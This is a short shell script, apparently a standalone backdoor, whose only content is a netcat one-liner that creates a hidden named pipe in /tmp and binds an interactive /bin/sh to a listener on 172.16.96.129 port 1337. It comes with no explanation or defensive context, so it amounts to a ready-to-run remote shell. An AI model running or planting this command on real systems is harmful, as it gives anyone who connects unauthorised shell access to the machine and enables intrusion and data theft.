#!/bin/sh

rm -f /tmp/.fdata && mkfifo /tmp/.fdata && cat /tmp/.fdata | /bin/sh -i 2>&1 | nc -l "172.16.96.129" 1337 > /tmp/.fdata
